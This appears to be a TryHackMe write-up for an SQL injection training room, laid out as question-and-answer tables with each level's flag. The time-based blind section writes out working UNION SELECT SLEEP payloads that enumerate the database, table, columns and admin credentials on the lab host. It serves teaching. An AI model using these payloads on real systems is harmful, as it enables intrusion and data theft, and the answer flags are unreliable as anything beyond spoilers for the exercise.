# Sql Injection



## Brief

| Questions | Answers |
|-----------|---------|
| What does the SQL stand for? | Structured Query Language |

## What is a Database ? 

| Questions | Answers |
|-----------|---------|
| What is the acronym for the software that controls a database ? | DBMS |
| What is the name of the grid-like structure which holds the data ? | table |

## What is SQL ?

| Questions | Answers |
|-----------|---------|
| What SQL statement is used to retrieve data ? | SELECT |
| What SQL clause can be used to retrieve data from multiple tables ? | UNION |
| What SQL statement is used to add data? | INSERT |

## What is SQL Injection ? 

| Questions | Answers |
|-----------|---------|
| What character signifies the end of an SQL query? | ; |

## In-Band SQLi

| Questions | Answers |
|-----------|---------|
| What is the flag after completing level 1 ? | THM{SQL_INJECTION_3840} |


## Blink SQLi - Authentication Bypass

| Questions | Answers |
|-----------|---------|
| What is the flag after competing level two ? (and moving to level 3) | THM{SQL_INJECTION_9581} |

## Blind SQLi - Boolean Based 

| Questions | Answers |
|-----------|---------|
| What is the flag after completing level three ? | THM{SQL_INJECTION_1093} |


## Blind SQLi - Time Based
database name : `sqli_four`
link to exploit 
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four%';--
```
table name : `users`
link to exploit 
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--
```

columns name : `username` and `password`
link to exploit
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 FROM information_schema.columns WHERE table_schema = 'sqli_four' and table_name='users' and column_name='username';--
```
username : `admin`
password : `4961`

link to exploit 
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password='4961';--
```
| Questions | Answers |
|-----------|---------|
| What is the final flag after completing level four ? | THM{SQL_INJECTION_MASTER} |

## Out-of-Band SQLi

| Questions | Answers |
|-----------|---------|
| Name a protocol beginning with D that can be used to exfiltrate data from a database. | DNS |

## Remediation

| Questions | Answers |
|-----------|---------|
| Name a method of protecting yourself from an SQL injection. | Prepared Statement |

